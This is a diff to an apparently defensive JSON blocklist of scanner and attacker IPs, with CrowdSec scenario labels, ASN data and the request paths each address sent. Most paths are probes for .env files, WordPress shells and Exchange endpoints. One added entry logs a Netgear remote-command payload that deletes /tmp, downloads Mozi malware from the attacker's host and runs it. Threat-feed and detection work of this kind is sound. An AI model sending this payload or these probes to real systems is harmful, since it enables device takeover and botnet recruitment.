@@ -1,96 +1,13 @@
 {
-  "generated_at": "2026-06-08T13:00:00Z",
+  "generated_at": "2026-06-09T01:00:00Z",
   "ttl_days": 7,
   "scope": "all",
   "counts": {
-    "total": 56,
-    "v4": 56,
+    "total": 61,
+    "v4": 61,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "64.62.156.172",
-      "family": "v4",
-      "first_seen": "2026-06-02T00:00:00Z",
-      "last_seen": "2026-06-02T00:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "6939",
-      "asn_name": "HURRICANE - Hurricane Electric LLC",
-      "asn_prefix": "64.62.128.0/18",
-      "tags": [
-        "mwl:scanner=\"shadowserver\""
-      ],
-      "payloads": [
-        "GET /remote/logincheck"
-      ]
-    },
-    {
-      "ip": "199.45.154.112",
-      "family": "v4",
-      "first_seen": "2026-06-01T17:00:00Z",
-      "last_seen": "2026-06-01T17:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398722",
-      "asn_name": "CENSYS-ARIN-03 - Censys",
-      "asn_prefix": "199.45.154.0/24",
-      "tags": [
-        "mwl:scanner=\"censys\""
-      ],
-      "payloads": [
-        "GET /",
-        "GET /debug/pprof/"
-      ]
-    },
-    {
-      "ip": "66.132.195.38",
-      "family": "v4",
-      "first_seen": "2026-06-01T16:00:00Z",
-      "last_seen": "2026-06-01T16:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398324",
-      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
-      "asn_prefix": "66.132.195.0/24",
-      "payloads": [
-        "GET /",
-        "GET /debug/pprof/"
-      ]
-    },
-    {
-      "ip": "20.169.85.114",
-      "family": "v4",
-      "first_seen": "2026-06-01T16:00:00Z",
-      "last_seen": "2026-06-01T16:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.160.0.0/12",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /owa/auth/logon.aspx"
-      ]
-    },
     {
       "ip": "145.226.30.112",
       "family": "v4",
@@ -1505,6 +1422,217 @@
         "GET /login.jsp",
         "GET /login",
         "GET /doc/index.html"
+      ]
+    },
+    {
+      "ip": "199.45.154.118",
+      "family": "v4",
+      "first_seen": "2026-06-08T21:00:00Z",
+      "last_seen": "2026-06-08T21:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:scanner=\"censys\""
+      ],
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "135.237.127.54",
+      "family": "v4",
+      "first_seen": "2026-06-08T21:00:00Z",
+      "last_seen": "2026-06-08T21:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /owa/auth/logon.aspx"
+      ]
+    },
+    {
+      "ip": "153.92.9.111",
+      "family": "v4",
+      "first_seen": "2026-06-08T20:00:00Z",
+      "last_seen": "2026-06-08T20:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "payloads": [
+        "GET /core/.env.save",
+        "GET /.env.save",
+        "GET /.env",
+        "GET /members/.env",
+        "GET /dev/.env",
+        "GET /api/.env.save",
+        "GET /core/.env",
+        "GET /api/.env",
+        "GET /app/.env",
+        "GET /backend/.env",
+        "GET /laravel/.env"
+      ]
+    },
+    {
+      "ip": "172.202.104.154",
+      "family": "v4",
+      "first_seen": "2026-06-08T20:00:00Z",
+      "last_seen": "2026-06-08T20:00:00Z",
+      "scenarios": [
+        "crowdsec/CVE-2022-41082"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /autodiscover/autodiscover.json?@zdi/Powershell"
+      ]
+    },
+    {
+      "ip": "223.123.43.6",
+      "family": "v4",
+      "first_seen": "2026-06-08T19:00:00Z",
+      "last_seen": "2026-06-08T19:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://223.123.43.6:60522/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "167.94.146.56",
+      "family": "v4",
+      "first_seen": "2026-06-08T18:00:00Z",
+      "last_seen": "2026-06-08T18:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:scanner=\"censys\""
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "132.196.94.72",
+      "family": "v4",
+      "first_seen": "2026-06-08T16:00:00Z",
+      "last_seen": "2026-06-08T16:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-probing",
+        "crowdsec/http-wordpress-scan"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "payloads": [
+        "GET /wp-temp.php",
+        "GET /xmu.php",
+        "GET /mode.php",
+        "GET /wp-admin/js/index.php",
+        "GET /dx.php",
+        "GET /wp-content/plugins/hellopress/wp_filemanager.php",
+        "GET /wp-admin/css/colour.php",
+        "GET /wp-includes/ID3/about.php",
+        "GET /wp-admin/js/",
+        "GET /wordpress/wp-admin/maint/",
+        "GET /this_is_a_new_hello_world.php",
+        "GET /x.php",
+        "GET /virus.php",
+        "GET /15ef5.php",
+        "GET /xb.php",
+        "GET /biufile.php",
+        "GET /Charles.php",
+        "GET /wpconf.php",
+        "GET /ultradybbuks.php",
+        "GET /novax.php"
+      ]
+    },
+    {
+      "ip": "199.45.154.115",
+      "family": "v4",
+      "first_seen": "2026-06-08T15:00:00Z",
+      "last_seen": "2026-06-08T15:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:scanner=\"censys\""
+      ],
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "20.63.80.176",
+      "family": "v4",
+      "first_seen": "2026-06-08T15:00:00Z",
+      "last_seen": "2026-06-08T15:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-probing",
+        "crowdsec/http-wordpress-scan"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /mode.php",
+        "GET /wp-content/plugins/hellopress/wp_filemanager.php",
+        "GET /wp-admin/css/colour.php",
+        "GET /wp-includes/ID3/about.php",
+        "GET /wp-admin/js/",
+        "GET /wordpress/wp-admin/maint/",
+        "GET /this_is_a_new_hello_world.php",
+        "GET /x.php",
+        "GET /virus.php",
+        "GET /15ef5.php",
+        "GET /xb.php",
+        "GET /biufile.php",
+        "GET /Charles.php",
+        "GET /wpconf.php",
+        "GET /ultradybbuks.php",
+        "GET /cc2.php",
+        "GET /wp-admin/js/index.php",
+        "GET /dx.php",
+        "GET /puc.php",
+        "GET /wp-temp.php"
       ]
     }
   ]
